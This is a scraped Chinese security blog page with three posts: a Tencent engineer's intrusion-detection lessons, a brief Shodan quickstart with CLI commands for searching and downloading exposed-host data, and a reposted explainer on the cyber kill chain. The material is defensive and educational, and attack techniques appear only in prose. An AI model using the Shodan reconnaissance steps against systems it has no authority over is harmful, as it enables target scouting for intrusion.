-<h2 id="2-Web入侵"><a href="#2-Web入侵" class="headerlink" title="2. Web入侵"></a>2. Web入侵</h2><p>随着高危端口的加固，黑客知识库里的攻击手法很多都会失效了。但是Web服务是现代互联网公司的主要服务形式，不可能也都关掉。于是，基于PHP、JAVA、ASP/<a href="http://ASP.NET%E3%80%81NODE%E3%80%81C%E5%86%99%E7%9A%84cgi%E7%AD%89%E7%AD%89%E5%8A%A8%E6%80%81%E7%9A%84Web%E6%9C%8D%E5%8A%A1%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%B0%B1%E5%8F%98%E6%88%90%E4%BA%86%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E7%9A%84%E6%9C%80%E4%B8%BB%E8%A6%81%E7%9A%84%E5%85%A5%E5%8F%A3%E4%BA%86%E3%80%82/" target="_blank" rel="external">http://ASP.NET、NODE、C写的cgi等等动态的Web服务本身的漏洞，就变成了黑客入侵的最主要的入口了。</a></p>
-<p>比如利用上传功能直接上传一个WebShell、利用文件包含功能，直接引用执行一个远程的WebShell、利用代码执行的功能，直接当作SHELL的入口执行任意命令，利用解析一些图片、视频的功能，上传一个恶意的样本，触发解析库的漏洞……</p>
-<p>这里的细分手法是一个专门的领域（道哥专门写了本《白帽子讲Web安全》），当然，由于它们都是由Web服务做为入口的，所以，入侵检测的时候，也总有一些办法，找到黑客GetShell和正常业务行为的一些区别。</p>
-<p>这里，基于WAF日志、Access Log、Auditd记录的系统调用或者SHELL指令，网络层面上针对response包体里的特征，都可能提炼出很多攻击手法，建议主要的精力放在这里。</p>
-<h2 id="3-0day入侵"><a href="#3-0day入侵" class="headerlink" title="3. 0day入侵"></a>3. 0day入侵</h2><p>通过NSA泄漏的工具包来看，早些年他们是拥有直接攻击Apache、Nginx这些服务的能力的。这意味着对手很可能有一些我们不知道的漏洞，神不知鬼不觉就GetShell了。</p>
-<p>但是对于入侵检测而言，这并不重要 ： 因为我们从来不在乎你利用什么漏洞，我们只关注你所使用的shellcode和之后的行为。Apache存在0day漏洞被攻击，还是一个php页面存在低级的漏洞被攻击，从入侵的行为上来看，说不定是完全一样的，入侵检测模型可以通用。</p>
-<p>所以，多把精力聚焦在有哪些黑客手法上，会比关注存在哪些漏洞更有价值 —— 当然，具体漏洞还是要实际投入跟进和测试，验证模型的效果。</p>
-<h2 id="4-通过办公网入侵"><a href="#4-通过办公网入侵" class="headerlink" title="4. 通过办公网入侵"></a>4. 通过办公网入侵</h2><p>绝大多数APT报告里，黑客是先对人下手，比如发个邮件，哄骗你打开后，控制了你的PC，再进行长期的观察/翻阅，拿到你的合法凭据后，再到内网漫游。这一部分，由于之前的合作里，是另一个团队负责的，所以就不展开了。其实这里才是APT对抗的重头戏，业界多数产品也是围绕这里，而不是IDC的服务器，很遗憾没有太多的实战经验，希望以后有机会可以在这个领域做出一些事情。</p>
-<h1 id="入侵检测基本原则"><a href="#入侵检测基本原则" class="headerlink" title="入侵检测基本原则"></a>入侵检测基本原则</h1><ol>
-<li>不能把每一条告警都彻底跟进的模型，等同于无效模型 ——有入侵了再说之前有告警，只是太多了没跟过来/没查彻底，这是马后炮，等同于不具备发现能力；</li>
-<li>我们必须屏蔽一些重复发生的相似的误报告警，以集中精力对每一个告警都闭环掉 —— 这会产生白名单，也就是漏报，因此单个模型的漏报是不可避免的；</li>
-<li>由于任何单模型都会存在漏报，所以我们必须在多个纬度上做多个模型，形成纵深 —— 假设WebShell静态文本分析被黑客变形绕过了，在RASP（运行时环境）的恶意调用还可以监控到，这样可以选择接受单个模型的漏报，但在整体上仍然不漏；</li>
-<li>任何模型都有误报漏报，我们做什么，不做什么，需要考虑的是“性价比” —— 比如某些变形的WebShell可以写成跟业务代码非常相似，人的肉眼几乎无法识别，再追求一定要在文本分析上进行对抗，就是性价比很差的决策，通过RASP的检测方案，其性价比更高一些；</li>
-<li>我们不可能知道黑客所有的攻击手法，也不可能针对每一种手法都建设策略（不具备性价比），但是，针对重点业务，我们可以通过加固的方式，让黑客能攻击的路径极度收敛，仅在关键环节进行对抗（包括加固的有效性检测）可能会让100%的目标变得现实</li>
-</ol>
-<p>基于上述几个原则，我们可以知道一个事实，或许，我们永远不可能在单点上做到100分，但是，我们可以通过一些组合方式，让攻击者很难绕过所有的点。</p>
-<p>当老板或者蓝军挑战，为何漏过某个单点的行为时，其实可以换个思维，看其是否能完全不触碰全局防御体系的实现攻击目标。如果为了“政治正确”，在某个单点上进行无止境的投入，最终可能只是在试图制造一个永动机，纯粹浪费人力、资源，而不产生实际的收益。</p>
-<h1 id="入侵检测产品的主流形态"><a href="#入侵检测产品的主流形态" class="headerlink" title="入侵检测产品的主流形态"></a>入侵检测产品的主流形态</h1><p>入侵检测终究是要基于数据去建模，比如针对WebShell的检测，首先要识别web目录，再对里面的文件进行文本分析，这需要做一个采集器。</p>
-<p>基于SHELL命令的入侵检测模型，需要获取所有SHELL命令，这可能要Hook系统调用或者劫持SHELL。</p>
-<p>基于网络IP信誉、流量payload进行检测，或者基于邮件网关对内容的检查，可能要植入网络边界里，对流量进行旁路采集。</p>
-<p>也有一些集大成者，基于多个sensor，将应用日志进行采集后，汇总在一个SOC或者SIEM，再交由大数据平台进行分析运算模型，因此，业界的产品大致上就分成了以下的形态：</p>
-<ol>
-<li><strong>主机Agent类</strong> ：黑客攻击了主机后，在主机上进行的动作，可能会产生日志、进程、命令、网络等记录，那么在主机上部署一个采集器（也内含一部分检测规则），就叫做基于主机的入侵检测系统，简称HIDS；</li>
-</ol>
-<p>典型的产品：OSSEC、云盾、360、安全狗，当然，一些APT厂商，往往也有在主机上的sensor/agent，比如FireEye等</p>
-<ol>
-<li><strong>网络检测类</strong> ：由于多数攻击向量是会通过网络对目标进行一些payload的投放，或者控制目标，因此，这些payload和控制协议，就会有一定的特征，在网络层面可以识别出来；</li>
-</ol>
-<p>典型的产品：Snort，到商业的各种NIDS/NIPS，如今的威胁情报检测系统TIP，也属于这一类；</p>
-<ol>
-<li><strong>日志集中存储类</strong> ：这一类产品允许主机、网络设备、应用都输出各自的日志，集中到一个统一的后台，在这个后台，对各类日志进行综合的分析，判断是否可以关联的把一个入侵行为的多个路径刻画出来，例如A主机的的Web访问日志里显示遭到了扫描和攻击尝试，继而主机层面多了一个陌生的进程和网络连接，最后A主机对内网其它主机进行了横向渗透尝试……；</li>
-</ol>
-<p>典型的产品：Splunk, Kibana，各种SIEM解决方案</p>
-<ol>
-<li><strong>网关沙箱执行类</strong> ：本质上这类产品是类型2（网络检测类）的一种子集，只不过它不重点监控恶意特征（绕过的姿势太多，而且有加密的手法使得payload完全无法被检测），因此，此类产品往往部署在网关出入口，或者邮件等服务器前面，通过协议分析，识别流量里的文件，通过虚拟机/沙箱的模拟执行（很多鱼叉攻击的附件），如果发现类似于doc文件被word打开后，派生CMD之类的异常行为（触发网络下载行为、调用了危险的系统函数等都算），就可以把它拦截或者告警出来；</li>
-</ol>
-<p>典型产品：FirEye、PaloAuto</p>
-<ol>
-<li><strong>主机安全防御产品</strong> ：本质上它也是类型1的一种子集，但是大家可能更耳熟能详 —— 主流的杀毒软件（此时可以成为终端安全管理方案），会严密的监控主机上的一举一动，比如下载了一个文件、启动了一个程序，都可以触发一次安全检查。它和类型1的主要区别，是工作在系统更底层，并且多数逻辑是在本地而非后台；严格一些的产品，比如Bit9，甚至会通过白名单的方式，允许特定的进程运行，而阻止一切未知的新的文件，哪怕是黑客控制了服务器，试图植入木马长期潜伏，也可能因为此安全机制而失效。</li>
-</ol>
-<p>典型产品：Bit9、SEP、赛门铁克、卡巴斯基…</p>
-<h1 id="入侵检测效果评价指标"><a href="#入侵检测效果评价指标" class="headerlink" title="入侵检测效果评价指标"></a>入侵检测效果评价指标</h1><p>首先，主动发现的入侵案例/所有入侵 = 有效发现率。这个指标一定是最直观的。</p>
-<p>比较麻烦的是分母，很多真实发生的入侵，如果外部不反馈，我们又没检测到，它就不会出现在分母里，所以有效发现率总是虚高的，谁能保证当前所有的入侵都发现了呢？</p>
-<p>而且，真实的入侵其实是一个低频行为 —— 毕竟，我们的目标是不发生入侵，应该提前加固好，不给黑客可趁之机才对。很久没出现真实入侵案例，这个指标长期不变化，是无法刻画入侵检测能力的提升的。</p>
-<p>所以一般还会引入2个指标来观测：</p>
-<ol>
-<li>蓝军对抗主动发现率</li>
-<li>已知场景建成覆盖率</li>
-</ol>
-<p>蓝军主动对抗和演习，弥补真实入侵事件低频的缺陷，但是由于蓝军掌握的攻击手法往往也是有限的，他们多次演习后，手法和场景可能会被罗列完毕，这里的建设和补漏不会那么及时。</p>
-<p>所以，把已知攻击手法的建成覆盖率拿出来，也是一个侧面评价指标。</p>
-<p>入侵检测团队把精力聚焦在已知攻击手法的优先级评估和快速覆盖上，对建设到什么程度是满足需要的，要有自己的专业判断。（参考入侵检测原则里的“性价比”原则）</p>
-<p>比如，我们目前制定的新策略上线前的验收标准是：</p>
-<ol>
-<li>单场景日均工单&lt;X单，峰值&lt;Y单；所有场景日平均&lt;Z，峰值&lt;XX，超出该指标的策略不予接收，不视为具备对应能力；</li>
-<li>同IP、相同业务模块（类似属性）多次触碰相同规则，具备自动抑制能力，首次出现告警，多次出现自动合并；</li>
-<li>具备误报自学习能力</li>
-<li>具备可读性（有清晰的风险阐述、关键信息、处理指引、辅助信息或者索引，便于定性）</li>
-<li>策略上线前需要自测(输出自测报告)、有清晰的说明文档(运营人员按照这个文档验收)</li>
-<li>策略验收完成需输出验收报告</li>
-<li>不得私自调用微信、短信等接口发告警，必须走统一的告警框架(应急策略临时可开通，2-3天缓冲期，但必须用正式策略替换应急策略，或者下掉应急策略)</li>
-</ol>
-<p>在满足验收标准的前提下，策略人员形成文档，说明对当前场景哪些手法具备覆盖能力，哪些前提下会无法告警（考验一个人对该场景和自己模型的理解能力）。可以对策略的成熟度形成自评得分，0-100分满分，自评满足基础的覆盖能力后，可能还存在一些遗憾，它们的提高边际成本变高，很可能不会追求到极致，而是投入到下一个场景的覆盖里去。如果某个场景出现了真实对抗，又没有交叉的其它策略进行弥补，那自评满足要求的结论是要被推翻的。</p>
-<h1 id="影响入侵检测的关键要素"><a href="#影响入侵检测的关键要素" class="headerlink" title="影响入侵检测的关键要素"></a>影响入侵检测的关键要素</h1><p>讨论影响入侵检测的要素时，我们可以简单看看曾经发生过哪些错误导致我们不能主动发现入侵（这里的每一条，背后可能都是一个令人遗憾的真实漏报case）：</p>
-<ol>
-<li>依赖于主机agent采集数据的模型，在当事机器上，没部署安装/agent挂了/数据上报过程丢失了/Bug了</li>
-<li>后台数据分析模块故障（丢弃数据）</li>
-<li>策略脚本Bug、没启动</li>
-<li>还没建设对应的策略</li>
-<li>策略的灵敏度不够（比如扫描的阈值没达到，WebShell用了变形的对抗手法）</li>
-<li>模型依赖的部分基础数据错误，做出了错误的判断</li>
-<li>成功告警了，但是工单应急同学错误的判断/没有跟进/辅助信息不足以定性</li>
-</ol>
-<p>所以，实际上，要让一个入侵事件被捕获，我们需要有专门的运营人员对以下目标负责：</p>
-<ol>
-<li>数据采集的完整性</li>
-<li>每一个策略时刻工作正常（拨测监控）</li>
-<li>针对高危场景策略要覆盖，灵敏度要满足一般对抗需要</li>
-<li>依赖的基础数据要准确</li>
-<li>工单运营支撑平台及追溯辅助工具完备</li>
-</ol>
-<p>可能有些同学会想，影响入侵检测的关键要素难道不是模型的有效性么？怎么全是这些乱七八糟的东西？</p>
-<p>实际上，稍微上规模的企业，上述的每一点要长期维持在高可用标准，都非常不容易。比如懂攻防的策略同学，对基础数据质量不关心不负责，最终的效果就是明明能发现的入侵，总是有各种原因恰好发现不了。之前，笔者亲历过有大量的案例，明明对手很菜，手法很简单，但就是因为这些因素给漏过了。</p>
-<p>所以，我常感慨，以某些运营质量之差，根本轮不到跟黑客拼策略（技术）。</p>
-<p>当然，一旦有兄弟帮忙去跟进这些质量运营工作之后，我们的确就真的需要拼策略了。</p>
-<p>这个时候，攻击手法有那么多，凭什么先选择这个场景建设？凭什么认为建设到这个程度就足够满足对已知手法的感知了？凭什么选择发现这些样本而放弃那些样本？</p>
-<p>这些极具主观性的东西，往往考验的是判断力、执行力等专业度，不能等到黑客入侵了才解释说，这个场景我们原定明年建设的……</p>
-<h1 id="如何发现APT"><a href="#如何发现APT" class="headerlink" title="如何发现APT"></a>如何发现APT</h1><p>所谓APT，就是高级的持续威胁。既然是高级的，按照一般的描述，他们的木马是免杀的（不能假定我们可以发现这个木马）、他们的漏洞不公开的（不能假定我们可以加固抵抗）、他们的手法是高级的（不能假定这个手法在已知的范畴里）。</p>
-<p>所以，实际上APT的意思就几乎等同于我们不能发现的入侵事件了。</p>
-<p>但是，业界总还有APT检测产品、解决方案的厂商在混饭吃，他们是怎么做的呢？</p>
-<p>说木马免杀的，他们用沙箱+人工分析，哪怕效率低一些，还是试图做出定性，并快速的把IOC（威胁情报）同步给其它客户，发现1例，全网都去排查。</p>
-<p>说流量变形对抗的，他们用异常检测的模型，把一些不认识的可疑的IP关系、payload给识别出来 —— 当然，识别出来之后，也要运营人员跟进得仔细才能定性。</p>
-<p>说攻击手法高级的，他们还是会假定黑客就用鱼叉、水坑之类的已知手法去执行，然后在邮箱附件、PC终端等环节采集日志，对用户行为进行分析，UEBA试图寻找出用户异于平常的动作。</p>
-<p>那么，我们呢？</p>
-<p>我没有什么好的办法，可以发现传说中的免杀的木马，但是我们可以针对已知的黑客攻击框架（比如metasploit、cobalt strike）生成的木马类型、行为进行一些特征的提取，比如DNS隧道的通讯，比如IP信誉的模型，比如默认生成的不免杀木马的共性特征等。</p>
-<p>我们可以假设已经有黑客控制了某一台机器，但是它试图进行横向扩散的时候，我们有一些模型可以识别它的探测、翻找、入侵尝试等行为。</p>
-<p>我们暂时还不知道如何100%发现APT，但是如果真的有APT在公司里，有本事这个团队别犯错，永远都不触碰我们所有的铃铛。否则，只要他犯错，就轮到我们出场了。</p>
-<p>前面所有的高标准，包括高覆盖、低误报，必须跟进到底，都是在等待这一刻。因此，我们坚持住，即使听过无数次“狼来了”，下一次仍然必须用最高的敬畏心去对待新的告警。</p>
-<h1 id="AI在入侵检测领域的正确姿势"><a href="#AI在入侵检测领域的正确姿势" class="headerlink" title="AI在入侵检测领域的正确姿势"></a>AI在入侵检测领域的正确姿势</h1><p>最近这2年，不谈AI故事就不会完整。</p>
-<p>只不过，随着AI概念的火爆，很多人已经把数据挖掘、统计分析的一些说法，比如分类、预测、聚类、关联之类的算法，改名字叫AI了。</p>
-<p>入侵检测本质上是对数据做标记（labeling）解决方式上，可以分为分类（classify），或者聚类（cluster），区别是已有的数据是否有标签。入侵检测领域，多数没有动辄上百万的样本的可供模型去训练，也就是无法使用数据来刻画特征。</p>
-<p>此时，安全领域一个比较常见的现象是，将场景转变成标记问题，要难过于通过数学模型把标记的解给求出来。也就是要业务专家先行，算法专家再跟上，而不能直接让算法专家闭门造车。</p>
-<p>所以，针对一个具体的攻击场景，怎么样采集对应的入侵数据，思考这个入侵动作和正常人的区别，这个特征的提取过程，往往决定了模型最终的效果。特征决定了效果的上限，而算法模型决定了多接近这个上限。</p>
-<p>如果有一个纯粹的AI团队，上来不关注攻击具体场景就用这些算法对已知样本进行训练和建模，是不可能有好的结果的。入侵检测的同学，和AI的同学，必须形成一种相互合作而不是单方面觉得高人一等的关系，才可能做出有实用价值的结果。</p>
-<p>此前，笔者曾见过一个案例，AI团队产出了一个实验室环境效果极佳，但是在实际环境里却不如人意的Webshell模型。这个项目的诞生，是源自该团队试图做一个AI模型来跟传统的Webshell模型做效果对比 —— 都是在文本静态分析方面去做检测，即便AI在实验室环境的效果再好，也仍旧有漏报，而且，原团队所放弃的抵抗，也由RASP弥补过了，于是该项目事实上并未产生应有的价值。</p>
-<p>这个例子并非说该团队不优秀，而是压根就不该让AI的同学去独自承担整个压力，甚至不推荐“使用AI做一个模型吧，看看是否比传统的好”这种想法，</p>
-<p>我个人认为，业务同学在思考场景短板后，跟算法同学共同商议，将AI用于业务的某一个环节，而非负责整个场景，或许，是更合适的思路。</p>
-<h1 id="入侵发现的运营陷阱"><a href="#入侵发现的运营陷阱" class="headerlink" title="入侵发现的运营陷阱"></a>入侵发现的运营陷阱</h1><p>入侵检测是一个苦逼的工作，任何时候手机一响，都要最紧张的去跟进 —— 又一次“狼来了”？还是一个APT高手团队唯一的破绽暴露了？</p>
-<p>在内部的一个Talk上，我把这个团队称为“守夜人” —— 从今日起，日日夜夜，至死方休。没有崇高的使命感，纯粹是为了做一份工作，很难有安全技术人才可以熬得下去。别的工作都可以下班，但我们never get off 。</p>
-<p>所以，借用Google的Detection团队的招聘广告里的说明，我想，应该也是我们的心声：</p>
-<p>Our goal is to build a world-class fully automated detection and response machine - an automated SOC.</p>
-<p>世界级的，全自动的SOC。</p>
-<p>能让机器和程序自动识别的，把误报降低到最低的入侵检测效果，可能才是我们想要的生活。</p>
-<p>有时候，为了快速覆盖一个入侵场景，简陋的发布了各种临时策略、临时代码架构、临时DB，随着数据量规模的增长开始变得奄奄一息。老算法的粗暴、简陋，也逐渐显得不合时宜。</p>
-<p>新场景的预研、开发、建设周期需要很长，支撑平台不够完善，在定性或者追溯或者预研一些模型时，无法高效实现，甚至导致策略建设使用各种变通手法来实现一个简单的想法……</p>
-<p>这些，都是入侵检测运营的一部分，也是阻碍我们达到终极目标的困难。</p>
-<p>把“入侵检测能力”当作一个产品，像创业公司一样，快速发布，具备能力，先发现一些“粗糙”、“明显”的事件，可能是第一步。而随着业务发展，自己的产品和平台也一样要在高速公路上奔跑的汽车那样换轮胎，一轮又一轮重构，分工逐渐明细，在质量上精益求精，不断打磨。</p>
-<p>这些事情需要公司的大力支持，因此，仅仅是通过忙碌的工作感动自己，而无法有效的输出工作本身的价值，获取公司的认同，其实是入侵检测运营工作的最大陷阱。</p>
-<h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>PS. 腾讯高度重视入侵检测，数据保护相关的工作。该团队长期招募大神，如果你在以下方面有读到的见解，欢迎加盟我们，一起守护10亿用户的幸福。</p>
-<ol>
-<li>精通主流的渗透手法，可以内部演习暴露问题或者验证入侵检测效果；</li>
-<li>熟悉APT组织极其攻击手法、工具，擅长捕获一手的APT细节情报，以便于指导红、蓝军改进工作方法；</li>
-<li>擅长建模，可以将检测思路落地为实际代码，在上百T、数百万级别的规模下，准实时的发出告警；</li>
-<li>擅长运营，可以将整个入侵检测工作相关的数据进行挖掘，暴露问题并改进，统筹应急流程，标准化并持续优化</li>
-</ol>
-<p>符合上述任意一类问题，简历可以投递： security@tencent.com</p>
-<p>期待大神的加盟，共同对抗APT大计。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/12/27/大型互联网企业入侵检测实战总结/" data-id="cjc7iqrrt000m5s1b262ohikn" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Shodan-快速入门" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/11/27/Shodan-快速入门/" class="article-date">
-  <time datetime="2017-11-27T04:25:57.000Z" itemprop="datePublished">2017-11-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/11/27/Shodan-快速入门/">Shodan 快速入门</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前几天黑五5$买了一个shodan Vip账号。找了几篇文章看了一些，在数据驱动安全的时代应该好好用起来</p>
-<p><a href="https://danielmiessler.com/study/shodan/" target="_blank" rel="external">https://danielmiessler.com/study/shodan/</a><br>A Shodan Tutorial and Primer</p>
-<p>Shodan在渗透测试及漏洞挖掘中的一些用法<br><a href="http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247484401&amp;idx=1&amp;sn=1e975c58d6abf58f9c9f9050e169fd70&amp;chksm=e89e2b29dfe9a23fd3183ac0ce5e483a484ad32054e70dde152e86352e3e07126fac03dc4a21&amp;mpshare=1&amp;scene=1&amp;srcid=1126TL9FBisM1YL6AucAqw4i#rd" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247484401&amp;idx=1&amp;sn=1e975c58d6abf58f9c9f9050e169fd70&amp;chksm=e89e2b29dfe9a23fd3183ac0ce5e483a484ad32054e70dde152e86352e3e07126fac03dc4a21&amp;mpshare=1&amp;scene=1&amp;srcid=1126TL9FBisM1YL6AucAqw4i#rd</a></p>
-<p>Shodan新手入坑指南<br><a href="http://www.freebuf.com/sectool/121339.html" target="_blank" rel="external">http://www.freebuf.com/sectool/121339.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">pip install shodan</div><div class="line">shodan init [api_key]</div><div class="line">shodan count [keyword]</div><div class="line">shodan download dstfile [keyword]</div><div class="line">shodan download dstfile </div><div class="line">shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz</div></pre></td></tr></table></figure>
-<p>利用Shodan和Censys进行信息侦查<br><a href="http://www.freebuf.com/articles/web/90887.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/90887.html</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/11/27/Shodan-快速入门/" data-id="cjc7iqrrj000d5s1bmbn2zaof" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-洛克希德·马丁定义的“杀伤链模型" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/11/18/洛克希德·马丁定义的“杀伤链模型/" class="article-date">
-  <time datetime="2017-11-18T05:56:05.000Z" itemprop="datePublished">2017-11-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/11/18/洛克希德·马丁定义的“杀伤链模型/">洛克希德·马丁定义的“杀伤链模型</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="http://www.aqniu.com/news-views/29381.html" target="_blank" rel="external">转</a></p>
-<p>对信息安全专家来说，用<strong>洛克希德-马丁</strong>公司的<strong>网络杀伤链</strong>（Kill Chain，也称网络攻击生命周期）来识别和防止入侵的方法可能并不陌生。然而，<strong>攻击者始终在改进攻击手段，这可能要求企业重新审视网络杀伤链。</strong>本文将回顾杀伤链模型对网络安全的意义，以及怎样在今天的威胁环境中使用它。</p>
-<p><strong>杀伤链模型可以拆分恶意软件的每个攻击阶段，从而实现识别和阻止功能，但是请注意，攻击策略是可以改变的。</strong></p>
-<p><strong>什么是网络杀伤链？</strong></p>
-<p>“杀伤链”这个概念源自军事领域，它是一个描述攻击环节的<strong>六阶段模型</strong>，该理论也可以用来反制此类攻击（即反杀伤链）。杀伤链共有“<strong>发现-定位-跟踪-瞄准-打击-达成目标</strong>”六个环节。</p>
-<p>在越早的杀伤链环节阻止攻击，防护效果就越好。例如，攻击者取得的信息越少，这些信息被第三人利用来发起进攻的可能性也会越低。</p>
-<p><strong>洛克希德-马丁公司提出的网络空间杀伤链与此类似，本质是一种针对性的分阶段攻击。</strong>同样，这一理论可以用于网络防护，具体阶段如下图所示：<img src="http://www.aqniu.com/wp-content/uploads/2017/11/%E6%9D%80%E4%BC%A4%E9%93%BE%E4%BF%A1%E6%81%AF%E5%9B%BE-1600-%E6%96%87%E5%AD%97%E6%9B%BF%E6%8D%A2-581x1024.jpg" alt="img"></p>
-<p><strong>“什么是杀伤链？”信息图</strong></p>
-<p>这就像传统的盗窃流程。小偷要先踩点再溜入目标建筑，一步步实行盗窃计划最终卷赃逃逸。要利用网络杀伤链来防止攻击者潜入网络环境，需要足够的情报和可见性来明了网络的风吹草动。当不该有的东西出现后，企业需要第一时间获悉，为此企业可以设置攻击警报。</p>
-<p>另一个需要牢记的点是：<strong>在越早的杀伤链环节阻止攻击，修复的成本和时间损耗就越低。</strong>如果攻击直到进入网络环境才被阻止，那么企业就不得不修理设备并核验泄露的信息。</p>
-<p>要想明确杀伤链技术是否适合自己的企业，不妨通过杀伤链模型的几个阶段入手，来发现企业应当核实的问题。</p>
-<p><strong>侦查阶段：从外部观察网络</strong></p>
-<p>在这个阶段，犯罪分子试图确定目标的好坏。<strong>他们从外部了解企业的资源和网络环境，并确定是否值得攻击。最理想的情况是，攻击者希望目标防备薄弱、数据值钱。</strong>罪犯可以找到的信息门类，以及这些信息如何被使用，可能会让企业大吃一惊。</p>
-<p>企业的信息价值往往超出他们想象。雇员的姓名和详细信息（不仅是企业网站，而且包括社交网站的信息）是否在网端存储？这些信息可以用来进行社会工程用途，比如，让人们透露用户名或密码。企业的网站服务器或物理位置是否接入网络吗？这些也可以用于社会工程，或帮助攻击者缩小企业环境漏洞的寻找范围。</p>
-<p>这个层面上的问题很难处理，社交网络的普及让它变得尤为棘手。将敏感信息隐藏起来是一个廉价的改善方式，虽然这也增加信息调用的时间成本。</p>
-<p><strong>武器化、散布、恶用、设置阶段：试图进入</strong></p>
-<p>这些阶段是攻击者用工具攻击被选目标的具体过程，他们收集的信息将被用于恶意行为。<strong>他们手头的信息越多，社会工程攻击就越无缝可击。</strong>通过员工在LinkedIn上的信息，他们可以用鱼叉式钓鱼获得公司内部资源。或者，他们可以把远程访问木马提前嵌入可能会录入重要信息的文件里，以诱使接收者运行它。如果他们知道用户或服务器运行的软件信息，比如操作系统版本和类型，他们在企业网络里渗透和布置的把握就大大增加。</p>
-<p>就这些阶段的防御而言，<strong>企业应当参照标准安全专家的建议去做。</strong></p>
-<p><strong>企业的软件是否达到最新？</strong>这需要具体到每台终端上的每个应用。大多数公司都有某个小角落还用着老式台式机，系统仍然用的是Windows 98。如果这台设备接入网络，无异于对攻击者门洞大开。</p>
-<p><strong>企业使用电子邮件和网页过滤功能吗？电子邮件过滤可以有效阻止攻击中常用的文档类型。</strong>如果企业的文件必须用某种标准发送，比如密码保护的ZIP文件，这可以让用户了解文件是否无误。网页过滤则可以防止用户访问已知的不良网站或域名。</p>
-<p><strong>企业禁用USB设备吗？</strong>从安全的角度来看，让文件不需许可就运行绝非什么好主意。最好在运行前，确保给用户有时间暂停和思考他们所看到的情况。</p>
-<p>企业使用端点保护软件的最新功能吗?虽然端点保护软件不是为了应对新型针对性攻击而设计，但是它们常常根据已知的可疑行为或软件漏洞来捕捉威胁。</p>
-<p><strong>命令与控制阶段（C&amp;C）：威胁已将变成现实</strong></p>
-<p>一旦威胁在企业的网络环境里扎根，它的下一个任务是给老窝打电话并等待指示。它可能下载额外的组件，更有可能的是通过C&amp;C通道联系一个僵尸网络主控机。无论哪种方式，这都要求网络流量，这意味着企业必须扪心自问：防火墙是否设置了新项目进行网络通信的警报？</p>
-<p>如果威胁已经实现了这些，它将对机器进行更改并将耗费IT工作人员对大量精力。有些公司或行业要求诊断受影响的机器上哪些数据被窃取或篡改。受影响的机器需要进行清洗或重置。如果数据已经备份，或者有可以快速加载到机器的标准企业模式，修复工作的成本和时间损耗就会有所降低。</p>
-<p><strong>有些攻击会另辟蹊径</strong></p>
-<p>去年的攻击状况已经充分证明了一点：<strong>攻击者不会严格按照游戏流程来——他们可能跳过步骤、添加步骤，甚至重复之前的步骤。</strong>最近的一些最具破坏性的攻击事件都是如此，这些攻击之所以能绕过安全团队耗费多年精心打造的防御体系，是因为它们有不同的流程安排。</p>
-<p>“符合洛克希德-马丁公司的杀伤链的恶意行为被重点关注，这也让某些攻击隐形了。”Kudelski Security的全球管理服务副总裁Alton Kizziah说。</p>
-<p>数据中心安全的领军者Alert Logic的合伙人、产品营销高级经理Misha Govshteyn指出：“杀伤链从来不能彻底符合我们看到的种种攻击。”</p>
-<p>根据2017年威瑞森的数据泄露调查报告，今年，网络程序攻击成为了数据泄露的最常见形式，在数据泄露案例中占到了近三分之一。<strong>常见方法是利用应用程序自身的漏洞。</strong></p>
-<p>最近的Equifax数据泄露事件就是典型例子。这种攻击很难发现。在两个月里，Equifax未在网站上发现可疑的网络流量。“通常到了数据外泄的时候，企业才能察觉。”Positive Technologies的网络安全弹性主管Leigh-Anne Galloway说。“或者，可能需要一个第三方的实体，例如某个客户，来提醒企业出了问题。”</p>
-<p>Equifax泄露案可以追溯到Apache Struts Web服务器软件中的一个漏洞。如果公司安装了这个漏洞的安全补丁，这个问题可能会避免，但是有时软件更新本身就是恶意攻击的桥梁，9月发生的CCleaner被黑事件就是一例。</p>
-<p>零日漏洞也是大麻烦。根据Contrast Security的共同创始人兼首席技术官杰夫·威廉姆斯的观点，<strong>平均每个软件应用和api拥有26.8个严重漏洞</strong>。“这是一个惊人的数字，”他说。“公众对Equifax感到愤怒，但事实是，几乎所有的公司在应用程序层都是不安全的。我们发现，世界各地有成千上万的IP地址正在进行的应用攻击尝试，这一现象正在扩散。”</p>
-<p><strong>要抵御这类攻击，企业必须缩短补丁的安装延迟。</strong>“过去的时候，直到应用程序漏洞被披露后的数周或数月，针对性的攻击才会出现，”他说，“但是今天，安全窗口已经只有一天左右，而在2018年，这一时间可能进一步缩减到几个小时。”</p>
-<p>他补充说，<strong>企业也需要开始将安全控件直接嵌入到应用程序里。</strong>这被称为应用程序的运行自保，Gartner预测这一细分市场的复合年增长率为9%。</p>
